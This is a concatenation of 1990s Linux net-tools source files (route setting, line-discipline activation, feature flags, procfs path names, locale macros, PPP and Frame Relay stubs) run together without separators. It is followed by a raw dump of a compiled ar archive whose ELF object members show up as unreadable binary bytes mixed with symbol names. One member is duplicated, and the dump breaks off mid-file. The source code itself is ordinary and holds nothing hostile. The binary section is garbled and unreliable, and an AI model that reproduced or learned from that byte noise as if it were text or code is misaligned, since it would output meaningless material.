		if(rt.rt_mss<64||rt.rt_mss>32768)
		{
			fprintf(stderr, NLS_CATGETS(catfd, routeSet, route_MSS, "route: Invalid MSS.\n"));
			return(E_OPTERR);
		}
		continue;
	}
	if (!strcmp(*args,"window")) {
		args++;
		if(!*args)
			return(usage());
		rt.rt_flags |= RTF_WINDOW;
		rt.rt_window = atoi(*args);
		args++;
		if(rt.rt_window<128||rt.rt_window>32768)
		{
			fprintf(stderr, NLS_CATGETS(catfd, routeSet, route_window, "route: Invalid window.\n"));
			return(E_OPTERR);
		}
		continue;
	}
	if (!strcmp(*args,"irtt")) {
		args++;
		if(!*args)
			return(usage());
		args++;
#if HAVE_RTF_IRTT
		rt.rt_flags |= RTF_IRTT;
		rt.rt_irtt = atoi(*(args-1));
		rt.rt_irtt*=(HZ/100); /* FIXME */
#if 0 /* FIXME: do we need to check anything of this? */
		if(rt.rt_irtt<1||rt.rt_irtt> (120*HZ))
		{
			fprintf(stderr, NLS_CATGETS(catfd, routeSet, route_irtt, "route: Invalid initial rtt.\n"));
			return(E_OPTERR);
		}
#endif
#else
		ENOSUPP("inet_setroute","RTF_IRTT");
#endif
		continue;
	}
	if (!strcmp(*args,"reject")) {
		args++;
#if HAVE_RTF_REJECT
		rt.rt_flags |= RTF_REJECT;
#else
		ENOSUPP("inet_setroute","RTF_REJECT");
#endif
		continue;
	}
	if (!strcmp(*args,"mod")) {
		args++;
		rt.rt_flags |= RTF_MODIFIED;
		continue;
	}
	if (!strcmp(*args,"dyn")) {
		args++;
		rt.rt_flags |= RTF_DYNAMIC;
		continue;
	}
	if (!strcmp(*args,"reinstate")) {
		args++;
		rt.rt_flags |= RTF_REINSTATE;
		continue;
	}
	if (!strcmp(*args,"device") || !strcmp(*args,"dev")) {
		args++;
		if (!*args)
			return(usage());
	} else
		if (args[1])
			return(usage());
	if (rt.rt_dev)
		return(usage());
	rt.rt_dev = *args;
	args++;
  }

#if HAVE_RTF_REJECT
  if ((rt.rt_flags & RTF_REJECT) && !rt.rt_dev)
	rt.rt_dev="lo";
#endif
	
  /* sanity checks.. */
  if (mask_in_addr(rt)) {
	__u32 mask = ~ntohl(mask_in_addr(rt));
	if (rt.rt_flags & RTF_HOST) {
		fprintf(stderr, NLS_CATGETS(catfd, routeSet, route_netmask1,
					    "route: netmask doesn't make sense with host route\n"));
		return(E_OPTERR);
	}
	if (mask & (mask+1)) {
		fprintf(stderr, NLS_CATGETS(catfd, routeSet, route_netmask2,
					    "route: bogus netmask %s\n"), netmask);
		return(E_OPTERR);
	}
	mask = ((struct sockaddr_in *) &rt.rt_dst)->sin_addr.s_addr;
	if (mask & ~mask_in_addr(rt)) {
		fprintf(stderr, NLS_CATGETS(catfd, routeSet, route_netmask3,
					    "route: netmask doesn't match route address\n"));
		return(E_OPTERR);
	}
  }

  /* Fill out netmask if still unset */
  if ((action==RTACTION_ADD) && rt.rt_flags & RTF_HOST)
	mask_in_addr(rt) = 0xffffffff;

  /* Create a socket to the INET kernel. */
  if ((skfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
	perror("socket");
	return(E_SOCK);
  }
  
  /* Tell the kernel to accept this route. */
  if (action==RTACTION_DEL) {
	if (ioctl(skfd, SIOCDELRT, &rt) < 0) {
		perror("SIOCDELRT");
		close(skfd);
		return(E_SOCK);
	}
  } else {
	if (ioctl(skfd, SIOCADDRT, &rt) < 0) {
		perror("SIOCADDRT");
		close(skfd);
		return(E_SOCK);
	}
  }

  /* Close the socket. */
  (void) close(skfd);
  return(0);
}

int INET_rinput(int action, int options, char **args)
{
  if (action == RTACTION_FLUSH) {
  	fprintf(stderr,"Flushing `inet' routing table not supported\n");
  	return(usage());
  }	
  if (options & FLAG_CACHE) {
  	fprintf(stderr,"Modifying `inet' routing cache not supported\n");
  	return(usage());
  }	
  if ((*args == NULL) || (action == RTACTION_HELP))
	return(usage());
  
  return(INET_setroute(action, options, args));
}
#endif	/* HAVE_AFINET */
/*
 * lib/activate.c	This file contains a small interface function to
 *			use the HW specific activate routines for line
 *			disciplines
 *
 * NET-LIB	A collection of functions used from the base set of the
 *		NET-3 Networking Distribution for the LINUX operating
 *		system. (net-tools, net-drivers)
 *
 * Version:	lib/activate.c 0.01 (1996-03-22)
 *
 * Author:	Bernd 'eckes' Eckenfels <net-tools@lina.inka.de>
 *		Copyright 1996 Bernd Eckenfels, Germany
 *
 * Modifications:
 *
 *960322 {0.01} Bernd Eckenfels:	creation
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include <stdio.h>
#include <string.h>
#include "net-support.h"
#include "pathnames.h"
#include "version.h"
#include "config.h"
#include "net-locale.h"

extern	struct hwtype	slip_hwtype;
extern	struct hwtype	cslip_hwtype;
extern	struct hwtype	slip6_hwtype;
extern	struct hwtype	cslip6_hwtype;
extern	struct hwtype	adaptive_hwtype;
extern  struct hwtype	ppp_hwtype;

extern int SLIP_activate(int fd);
extern int CSLIP_activate(int fd);
extern int SLIP6_activate(int fd);
extern int CSLIP6_activate(int fd);
extern int ADAPTIVE_activate(int fd);
extern int PPP_activate(int fd);

void
activate_init(void)
{
#if HAVE_HWSLIP
	slip_hwtype.activate     = SLIP_activate;
	cslip_hwtype.activate    = CSLIP_activate;
	slip6_hwtype.activate    = SLIP6_activate;
	cslip6_hwtype.activate   = CSLIP6_activate;
	adaptive_hwtype.activate = ADAPTIVE_activate;
#endif
#if HAVE_HWPPP
        ppp_hwtype.activate = PPP_activate;
#endif
}

int activate_ld(const char *hwname, int fd)
{
  struct hwtype *hw;
  
  hw = get_hwtype(hwname);
  
  if (!hw) {
	fprintf(stderr,NLS_CATGETS(catfd, libSet, lib_act_no_support, "Hardware type `%s' not supported.\n"),hwname);
	return(E_NOSUPP);
  }
  if (!hw->activate) {
	fprintf(stderr,NLS_CATGETS(catfd, libSet, lib_type_no_act, "Cannot change line discipline to `%s'.\n"),hw->name);
	return(E_OPTERR);
  }
  return(hw->activate(fd));
}
#include "config.h"

#if HAVE_AFNETROM
#include <sys/param.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <linux/route.h>
#include <sys/ioctl.h>
#include <ctype.h>
#include <errno.h>
#include <netdb.h>
#include <resolv.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include "version.h"
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"

#include "net-features.h"

extern     struct aftype   netrom_aftype;

/* static int skfd = -1; */

static int usage(void)
{
  fprintf(stderr,"netrom usage\n");

  return(E_USAGE);
}


int NETROM_rinput(int action, int ext, char **args)
{
  
  fprintf(stderr,"NET/ROM: this needs to be written\n");
  return(0);
}
#endif	/* HAVE_AFNETROM */
/*
 * lib/net-features.h	This file contains the definitions of all kernel
 *			dependend features.
 *
 * Version:	features.h 0.03 (1996-03-22)
 *
 * Author:	Bernd Eckenfels <net-tools@lina.inka.de>
 *		Copyright 1996 Bernd Eckenfels, Germany
 *
 * Modifications:
 *960201 {0.01}	Bernd Eckenfels:	creation
 *960202 {0.02}	Bernd Eckenfels:	HW and AF added
 *960322 {0.03}	Bernd Eckenfels:	moved into the NET-LIB
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */

/* 
 *	This needs to be included AFTER the KErnel Header Files
 *	one of the FEATURE_ should be defined to get the Feature Variable
 *	definition included
 */
 
#ifndef _NET_FEATURES_H
#define _NET_FEATURES_H

/* detect the present features */

#ifdef IP_FW_F_MASQ /* ipfw */
#  define HAVE_FW_MASQUERADE 1
#endif

#ifdef IP_FW_F_APPEND /* ipfw */
#  define HAVE_FW_APPEND 1
#endif

#ifdef IP_FW_F_TCPACK /* ipfw */
#  define HAVE_FW_TCPACK 1
#endif

#ifdef OLD_SIOCSARP /* arp */
#  define HAVE_NEW_SIOCSARP 1
#endif

#if defined (SIOCADDRTOLD) || defined (RTF_IRTT) /* route */
#  define HAVE_NEW_ADDRT 1
#endif

#ifdef RTF_IRTT /* route */
#  define HAVE_RTF_IRTT 1
#endif

#ifdef RTF_REJECT /* route */
#  define HAVE_RTF_REJECT 1
#endif

#ifdef RTMSG_NEWROUTE /* netstat */
#  define HAVE_RT_NETLINK 1
#endif

/* compos the feature information string */

#if defined (FEATURE_IPFW) || defined (FEATURE_ARP) || defined (FEATURE_ROUTE) || defined (FEATURE_NETSTAT)
static char *Features=

/* ---------------------------------------------------- */
#ifdef FEATURE_IPFW

#  if HAVE_FW_MASQUERADE
	"+"
#  else 
	"-"
#  endif
	"FW_MASQUERADE "
	
#  if HAVE_FW_APPEND
	"+"
#  else
	"-"
#  endif
	"FW_APPEND "

#  if HAVE_FW_TCPACK
	"+"
#  else
	"-"
#  endif
	"FW_TCPACK "

#endif /* FEATURE_IPFW */
/* ---------------------------------------------------- */


/* ---------------------------------------------------- */
#ifdef FEATURE_ARP

#  if HAVE_NEW_SIOCSARP
	"+"
#  else 
	"-"
#  endif
	"NEW_SIOCSARP "
	
#endif /* FEATURE_ARP */
/* ---------------------------------------------------- */


/* ---------------------------------------------------- */
#ifdef FEATURE_ROUTE

#  if HAVE_NEW_ADDRT
	"+"
#  else
	"-"
#  endif
	"NEW_ADDRT "
	
#  if HAVE_RTF_IRTT
	"+"
#  else
	"-"
#  endif
	"RTF_IRTT "

#  if HAVE_RTF_REJECT
	"+"
#  else
	"-"
#  endif
	"RTF_REJECT "

#endif /* FEATURE_ROUTE */
/* ---------------------------------------------------- */


/* ---------------------------------------------------- */
#ifdef FEATURE_NETSTAT

#  if HAVE_NEW_ADDRT
	"+"
#  else
	"-"
#  endif
	"NEW_ADDRT "
	
#  if HAVE_RTF_IRTT
	"+"
#  else
	"-"
#  endif
	"RTF_IRTT "

#  if HAVE_RTF_REJECT
	"+"
#  else
	"-"
#  endif
	"RTF_REJECT "

#  if HAVE_RT_NETLINK
	"+"
#  else
	"-"
#  endif
	"RT_NETLINK "

#  if HAVE_FW_MASQUERADE
	"+"
#  else 
	"-"
#  endif
	"FW_MASQUERADE "

#endif /* FEATURE_NETSTAT */
/* ---------------------------------------------------- */


#if NLS
	"+NLS"
#else
	"-NLS"
#endif /* NLS */


"\nAF:"
#ifdef DFLT_AF
	"("DFLT_AF")"
#endif

#if HAVE_AFUNIX
	" +"
#else
	" -"
#endif
	"UNIX "
#if HAVE_AFINET
	"+"
#else
	"-"
#endif
	"INET "
#if HAVE_AFIPX
	"+"
#else
	"-"
#endif
	"IPX "
#if HAVE_AFAX25
	"+"
#else
	"-"
#endif
	"AX25 "
#if HAVE_AFNETROM 
	"+" 
#else
	"-"
#endif
	"NETROM "
#if HAVE_AFATALK
	"+"
#else
	"-"
#endif
	"ATALK "

"\nHW:"

#ifdef DFLT_HW
	"("DFLT_HW")"
#endif

#if HAVE_HWETHER
	" +"
#else
	" -"
#endif
	"ETHER "
#if HAVE_HWARC
	"+"
#else
	"-"
#endif
	"ARC "
#if HAVE_HWSLIP
	"+"
#else
	"-"
#endif
	"SLIP "
#if HAVE_HWPPP
	"+"
#else
	"-"
#endif
	"PPP "
#if HAVE_HWTUNNEL
	"+"
#else
	"-"
#endif
	"TUNNEL "
#if HAVE_HWTR
	"+"
#else
	"-"
#endif
	"TR "
#if HAVE_HWAX25
	"+"
#else
	"-"
#endif
	"AX25 "
	
#if HAVE_HWNETROM
	"+"
#else
	"-"
#endif
	"NETROM "

#if HAVE_HWFR
	"+"
#else
	"-"
#endif
	"FR ";


#endif /* FEATURE_* */

#endif /* _NET_FEATURES_H */
/* End of features.h */
#include "config.h"

#if HAVE_AFIPX
#include <sys/param.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <linux/route.h>
#include <sys/ioctl.h>
#include <ctype.h>
#include <errno.h>
#include <netdb.h>
#include <resolv.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include "version.h"
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"

#include "net-features.h"

extern     struct aftype   ipx_aftype;

/* static int skfd = -1; */

/*
static int usage(void)
{
  fprintf(stderr,"IPX usage\n");

  return(E_USAGE);
}
*/

int IPX_rinput(int action, int ext, char **args)
{
  
  fprintf(stderr,"IPX: this needs to be written\n");
  return(0);
}
#endif	/* HAVE_AFIPX */
/*
 * lib/pathnames.h	This file contains the definitions of the path 
 *			names used by the NET-LIB. Do not change the values!
 *
 * NET-LIB	
 *
 * Version:	lib/pathnames.h 1.36 (1996-04-13)
 *
 * Maintainer:	Bernd 'eckes' Eckenfels, <net-tools@lina.inka.de>
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *
 * Modification:
 *960125 {1.31}	Bernd Eckenfels: 	Major cleanup, junk removed.
 *960131 {1.32}	Bernd Eckenfels:	/proc/net/ip_*
 *960204 {1.33} Bernd Eckenfels:	/dev/net/route
 *960215 {1.34} Bernd Eckenfels:	/proc/net/ax25_route,nr_*
 *960322 {1.35} Bernd Eckenfels:	moved to the lib directory
 *960413 {1.36} Bernd Eckenfels:	/proc/net/rt_cache
 *
 */

/* Pathnames of the PROCfs files used by NET. */

# define _PATH_PROCNET_TCP		"/proc/net/tcp"
# define _PATH_PROCNET_UDP		"/proc/net/udp"
# define _PATH_PROCNET_RAW		"/proc/net/raw"
# define _PATH_PROCNET_UNIX		"/proc/net/unix"
# define _PATH_PROCNET_ROUTE		"/proc/net/route"
# define _PATH_PROCNET_RTCACHE		"/proc/net/rt_cache"
# define _PATH_PROCNET_AX25_ROUTE	"/proc/net/ax25_route"
# define _PATH_PROCNET_NR		"/proc/net/nr"
# define _PATH_PROCNET_NR_NEIGH		"/proc/net/nr_neigh"
# define _PATH_PROCNET_NR_NODES		"/proc/net/nr_nodes"
# define _PATH_PROCNET_ARP		"/proc/net/arp"
# define _PATH_PROCNET_AX25		"/proc/net/ax25"
# define _PATH_PROCNET_IPX		"/proc/net/ipx"
# define _PATH_PROCNET_IPX_ROUTE	"/proc/net/ipx_route"
# define _PATH_PROCNET_ATALK		"/proc/net/appletalk"
# define _PATH_PROCNET_IP_BLK		"/proc/net/ip_block"
# define _PATH_PROCNET_IP_FWD		"/proc/net/ip_forward"
# define _PATH_PROCNET_IP_ACC		"/proc/net/ip_acct"
# define _PATH_PROCNET_IP_MASQ		"/proc/net/ip_masquerade"


/* Pathnames for the Netlink Devices */

# define _PATH_DEV_ROUTE	"/dev/route"



/* End of pathnames.h */
/*
 * lib/net-locale.h	Headerfile for the NLS functions
 *
 * NET-LIB	
 *
 * Version:	lib/net-locale.h 0.51 (1996-03-22)
 *
 * Author:	Bernd Eckenfels <net-tools@lina.inka.de>
 *		Copyright 1995-1996 Bernd Eckebnfels, Germany
 *
 * Modifications:
 *960125 {0.50}	Bernd Eckenfels:	included Header, reformated
 *960322 {0.51}	Bernd Eckenfels:	moved into lib/
 *
 */
#ifndef NET_LOCALE_H
#define NET_LOCALE_H

#if NLS
#  include <locale.h>
#  include <nl_types.h>

#  ifndef EXTERN
#    define EXTERN
#  else
#    undef EXTERN
#    define EXTERN extern
#  endif

   EXTERN nl_catd catfd;

   char *strsave (char *);
   char *str_in_buff (char *, int, char *);

#  define NLS_CATINIT catinit ();
#  define NLS_CATCLOSE(catfd) catclose (catfd);
#  define NLS_CATGETS(catfd, arg1, arg2, fmt) \
	catgets ((catfd), (arg1), (arg2), (fmt))
#  define NLS_CATSAVE(catfd, arg1, arg2, fmt) \
	strsave (catgets ((catfd), (arg1), (arg2), (fmt)))
#  define NLS_CATBUFF(catfd, arg1, arg2, fmt, buf, len) \
	str_in_buff (buf, len, catgets ((catfd), (arg1), (arg2), (fmt)))
#  include "nettools-nls.h"
#else
#  define NLS_CATINIT
#  define NLS_CATCLOSE(catfd)
#  define NLS_CATGETS(catfd, arg1, arg2, fmt) fmt
#  define NLS_CATSAVE(catfd, arg1, arg2, fmt) fmt
#  define NLS_CATBUFF(catfd, arg1, arg2, fmt, buf, len) strcpy (buf, fmt)
#endif

#endif /* NET_LOCALE_H */
/*
 * lib/ppp_ac.c	This file contains the activation for the
 *		PPP line disciplines, called from activate_ld().
 *
 * Version:	ppp_ac.c 0.01 (1996-03-22)
 *
 * Author:	Bernd 'eckes' Eckenfels
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_HWPPP

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/netdevice.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"


/* Start the VJ-SLIP encapsulation on the file descriptor. */
int PPP_activate(int fd)
{
  fprintf(stderr,"Sorry, use pppd!\n"); /* FIXME */
  return(-1);
}

#endif	/* HAVE_HWPPP */
/*
 * lib/frame.c	This file contains the Frame Relay support.
 *
 * Version:	lib/frame.c 0.01 (1996-03-23)
 *
 * Maintainer:	Bernd 'eckes' Eckenfels, <net-tools@lina.inka.de>
 *
 * Author:	Mike McLagan <mike.mclagan@linux.org>
 *
 * Changes:
 *
 *962303 {0.01}	Mike McLagan :		creation
 *960413 {0.02} Bernd Eckenfels :	included in net-lib
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_HWFR

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/netdevice.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"

char *pr_dlci(unsigned char *ptr)
{
   static char buf[12];

   sprintf(buf, "%i", *(short *)ptr);
   return(buf);
}

struct hwtype dlci_hwtype = {
  "dlci",	NULL, /*"Frame Relay DLCI",*/		ARPHRD_DLCI,	3,
  pr_dlci,	NULL,		NULL,		NULL
};

struct hwtype frad_hwtype = {
  "frad",	NULL, /*"Frame Relay Access Device",*/		ARPHRD_FRAD,	0,
  NULL,		NULL,		NULL,		NULL
};
#endif	/* HAVE_HWFR */
!<arch>
/               911697708   0     0     0       876       `
   7      8  H  h  h  #P  #P  6h  A  MH  MH  MH  MH  MH  MH  MH  MH  MH  MH  MH  MH  MH  \  \  \  d  d  jl  jl  jl  jl  jl  o,  x  }  f          J  J  .                      strsave str_in_buff getargs ip_masq_info unix_aftype unspec_aftype inet_aftype get_sname ipx_aftype ipx_aftype flag_unx flag_ipx flag_ax25 flag_ddp flag_netrom flag_inet aftrans afname afinit aftrans_def aftrans_opt get_aftype get_afntype hwinit get_hwtype get_hwntype unspec_hwtype loop_hwtype slip_hwtype cslip_hwtype slip6_hwtype cslip6_hwtype adaptive_hwtype ether_hwtype ppp_hwtype arcnet_hwtype tunnel_hwtype rprint_fib rprint_cache INET_rprint IPX_rprint getroute_init route_info INET_rinput IPX_rinput setroute_init route_edit SLIP_activate CSLIP_activate SLIP6_activate CSLIP6_activate ADAPTIVE_activate PPP_activate activate_init activate_ld net-string.o/   911697683   0     0     100644  1100      `
ELF                      D      4     (   S\$u    Bu)PCQt6CBu[6WVSt$\$T$t50H9rCPRV3 RV    [^_            01.01     GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .bss .note .rodata .comment                                                      4                     !   	           $  (   	            +                                   1                                   6                                   <                                  D                                                    M                                     
   	         	                G                                                                                                                                                       B     %              ,   D   V     8              @               net-string.c gcc2_compiled. strsave malloc str_in_buff strncpy strcpy  
        
  s               getargs.o/      911697684   0     0     100644  980       `
ELF                      p      4     ( 
     UWVS$  $  1V\$S|$ t{v sB< t<	tt G<"t<'u2B: t268uz\uBF: uB<	tBFt< u FtB< t<	t: uD     G~[^_]                01.01    GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .bss .note .comment                                                       4                     !   	                            +                                  1                                  6                                  <                                                *  E                                      	            	                )                                                                                                                                              "               getargs.c gcc2_compiled. getargs strcpy    !   	  masq_info.o/    911697686   0     0     100644  4068      `
ELF                            4     (   UWVSt$ |$$\$(FPh    d   1T$<   1T$ p  1D$D$PT$$RL$$Qh   ~?=    t F6PF4PF0Ph   v F4PF0Ph(       WFPBPh:       WFPBPh:    WFPF(PPhA   WFPF*PPhH   (WFPF,PPhK   [^_]  UWVS19$$    T$T$$   =    tOSC6PC4PC0PC,PC*PCPC(PCPT$4RhR   $H  R0uK[^_]  6SC4PC0PC,PC*PCPC(PCPT$0Rhz   $D  R,v =    t
u8	t3h   h   h   h   h    [^_]  6fC fC   |$    uC  -6  |$    th   h$  v C   CCCCfC(fC(fC*fC*fC,fC,8E9$$  [^_]  v   UWVSD$    h?  hA  D$|$ uU=    t hA  [^_]  v hY  hg  ho  h       [^_]  h      u6h  h  h  h    T$$R[^_]  T$Rh   \$ Sh  S   h  u;h   h$  h  h   h    T$(R[^_]    1j7PT$Ru.    D$UVuh   h4  T$R}t	V[^_]  6\$|$ ~rhE  $   u
h^  v h  |$ ~0T$RB<$   R$   RS89|t	V1[^_]              01.01   %-4s %3ld:%02ld.%02ld  %10lu %5hd %5hd  %10lu %5hd     -  %-20s  %s ->  %s  (%s)
  %s %lX:%hX %lX:%hX %hX %lX %hd %hd %lu  %s %lX:%hX %lX:%hX %hX %lX %hd %lu net-tools@lina.inka.de (Bernd Eckenfels) ip_masquerade format error masq_info.c %s: Internal Error `%s'.
Contact: %s
 TCP tcp UDP udp ip_masquerade unknown type r /proc/net/ip_masquerade ip_masquerade netstat %s: no support for `%s' on this system.
 inet AF INET masq_info %s: feature `%s' not supported.
Please recompile `net-tools' with newer kernel source or full configuration.
 PDelta malloc() failed realloc() failed IP masquerading entries
 prot   expire source               destination          ports
 prot   expire    initseq delta prevd source               destination          ports
  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .bss .note .rodata .comment                                                        4   R                 !   	           <    	            +                                  1                                 6                                  <                                D                                                  M                                
    
            	              x                                                                     C    '            2             5   D                                                                                          C              J              T              [              g              o     Z    |                                                                                                                                             masq_info.c gcc2_compiled. print_masq has_pdelta ap read_masqinfo printf get_sname fscanf _IO_stderr_ fprintf ip_masq_info fopen errno perror get_aftype fclose fgets strstr malloc realloc free             ^     c     q                                                                                  )    /    4    n                                     %    *    /    U    l    u                            )    1    6    Q    V    [    `    e    }                                                                         "    '    1    ~                                        >    unix.o/         911697686   0     0     100644  1708      `
ELF                      (      4     (  	 WVSt$    16PFh    SGv0         [^_6D$fftfu5   @   
   D   f   fH      J   @   v P_v D$v D$fftfu5      
      f   f            v Pv                                                        P                             01.01   %02X- [NONE SET] unix unspec  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .rel.data .bss .note .rodata .comment                                                        4                    !   	                
            +             <  P                  1   	           |  0   
            ;                                 @                                  F                                 N                                                  W                                  0              	              8                                                                     @             N     ,   @   @      3   P   X     A           L      @      S      X                                                                                         _              g       (     s   (   (      unix.c gcc2_compiled. buff.38 UNSPEC_print buf.41 UNSPEC_sprint UNIX_print buf.46 UNIX_sprint sprintf unix_aftype unspec_aftype       
            .   
  @   
  F   
  d     i   
  n     s   
  y        
          
     
          
          
          
          
     
                  (     8     <     inet.o/         911697688   0     0     100644  4104      `
ELF                             4     (  	 UWVSl$\$f fC          uC       [^_]       uC   [^_]Ut%BCPU   [^_]6Ut)GKGPRQPU1[^_]        [^_]UWVSl$t$T$ f>t    a   [^_]FD$u5  u5f}    E    E6f   fE 1[^_]  t FPPU1[^_]v    t69C   [uD$11tjjD$Pt'6jPtPUuuFPPUjFCFCFC   C0PCUP   1[^_]6CPU1[^_]D$P6D$ PT$L$ff=tfu2             f"   f   $   
       QRh    u	    v 1UWVSl$|$f fG  D$    t$6    <w<	v[^_]v !C    <v<	v	v CAF9vD$G)[^_]v T$D$|$uPR66PR1L$T$u
B    B6T$D$t9t	@u16UWVSj6   juh*   PECE s2      1t
FO)u
Uh    <6s6       uUh   s:       `Uh   	M1[^_]UWVSl$\$u   [^_]6|$ t)%  Ph>   h      [^_]v =8    u8       2       u	U    66       u	U   :       u)U   PUt@PhA   h   =    u%  Ph>   h      [^_]                 %                   p                        01.01   default 255.255.255.255 * [NONE SET] inet netstat tcp udp raw %d %s  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .rel.data .bss .note .rodata .comment                                                         4                    !   	           x  h  
            +                9                  1   	             (   
            ;             \                    @              \                    F             p  D                  N                                                  W                                 	                	                                                                                                   )           2           :            G          U   p       c          n             v     g                    '                                         @         8                                                                                                                                                                                                                       *             1             8             H     (     T             _             j             q             x                                   inet.c gcc2_compiled. tcp_name udp_name raw_name INET_nn INET_resolve INET_rresolve INET_reserror INET_print buff.50 INET_sprint INET_getsock INET_input add2list searchlist read_services buffer.63 init.64 memcpy getnetbyname strcpy gethostbyname h_errno errno inet_ntoa gethostbyaddr getnetbyaddr malloc herror __ctype_toupper inet_aftype setservent getservent perror strdup endservent get_sname sprintf         ?     b                                        )    1    >    ]     d    z      !    "                 #      5  #  ?    E    ^    v  $                                                   (  %  b  %    '  !  (  2  #  @    E  )  P  *  a                          +                -      .    <    C    K    ]    g    y                      -                -                 $     (     ,     ax25.o/         911697688   0     0     100644  663       `
ELF                             4     ( 	            01.01    GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .data .bss .note .comment                                                         4                      !             4                      '             4                      ,              4                     2              H                                   Z   ;                                                  	                                                                                                                                                   ax25.c gcc2_compiled. 
ipx.o/          911697690   0     0     100644  2144      `
ELF                            4     (  	 T$   | uHutFBtZBPBPBPB
PB	PBPQh    h    $bv BtJPh   h    <BPBPBPB
PB	PBPh%   h     	6         v D$f8uP%>   @   B   D   fF   fH   H   J   @   6WVS\$|$fG  w6    <w	<	w`!C    <w	v <	w4CAF9vGI       tR       u[^_v 1[^_6UWVSt$|$\$ f C    C C C C
 C	 C fC  1   tE`D$j jPWtu[^_]uCu%D$8 t[^_]v 1[^_]6uD$8:t[^_]6xSWz[^_]v Y                                             01.01   %08lX:%02X%02X%02X%02X%02X%02X %08lX %02X%02X%02X%02X%02X%02X [NONE SET]           ipx  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .rel.data .bss .note .rodata .comment                                                        4                    !   	           x     
            +               (                  1   	           @      
            ;                                 @                                  F               ]                  N              u                                    W                                  0              	                                                                                   @                  (   @   @      /      J     :          F                                                                                              P              X              h              {       (      ipx.c gcc2_compiled. buff.42 IPX_print buf.45 IPX_sprint IPX_getsock IPX_input sprintf __ctype_toupper __strtoul_internal ipx_aftype   J   	  O   
  T     p   	  u   
  z        	     
          
     
     	     
     	     
     	     
    	    
    
  0    Z      	    	          	                 ddp.o/          911697690   0     0     100644  662       `
ELF                             4     ( 	            01.01    GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .data .bss .note .comment                                                         4                      !             4                      '             4                      ,              4                     2              H                                   Z   ;                                                  	                                                                                                                                                   ddp.c gcc2_compiled. ipx.o/          911697690   0     0     100644  2144      `
ELF                            4     (  	 T$   | uHutFBtZBPBPBPB
PB	PBPQh    h    $bv BtJPh   h    <BPBPBPB
PB	PBPh%   h     	6         v D$f8uP%>   @   B   D   fF   fH   H   J   @   6WVS\$|$fG  w6    <w	<	w`!C    <w	v <	w4CAF9vGI       tR       u[^_v 1[^_6UWVSt$|$\$ f C    C C C C
 C	 C fC  1   tE`D$j jPWtu[^_]uCu%D$8 t[^_]v 1[^_]6uD$8:t[^_]6xSWz[^_]v Y                                             01.01   %08lX:%02X%02X%02X%02X%02X%02X %08lX %02X%02X%02X%02X%02X%02X [NONE SET]           ipx  GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .rel.text .data .rel.data .bss .note .rodata .comment                                                        4                    !   	           x     
            +               (                  1   	           @      
            ;                                 @                                  F               ]                  N              u                                    W                                  0              	                                                                                   @                  (   @   @      /      J     :          F                                                                                              P              X              h              {       (      ipx.c gcc2_compiled. buff.42 IPX_print buf.45 IPX_sprint IPX_getsock IPX_input sprintf __ctype_toupper __strtoul_internal ipx_aftype   J   	  O   
  T     p   	  u   
  z        	     
          
     
     	     
     	     
     	     
    	    
    
  0    Z      	    	          	                 netrom.o/       911697690   0     0     100644  665       `
ELF                             4     ( 	            01.01    GCC: (GNU) 2.7.2  .symtab .strtab .shstrtab .text .data .bss .note .comment                                                         4                      !             4                      '             4                      ,              4                     2              H                                   Z   ;                                                  	                                                              
                                                                                     netrom.c gcc2_compiled. 
af.o/           911697691   0     0     100644  3732      `
ELF                            4     (  	    1      8      D      S   f   6UWVSt$\$ D$$Ph    j/SD$ |$ u\$6D$D$P   0Jl$H9rS[^_]6T$0L$)T$VD$Pu|$ j_SD$|$ tD$       S   tSh    S[^_]v VSt$f=   u  =   t!V Pu[^; uj,VthW   h    1[^6S\$f=   u  =   t69Xt
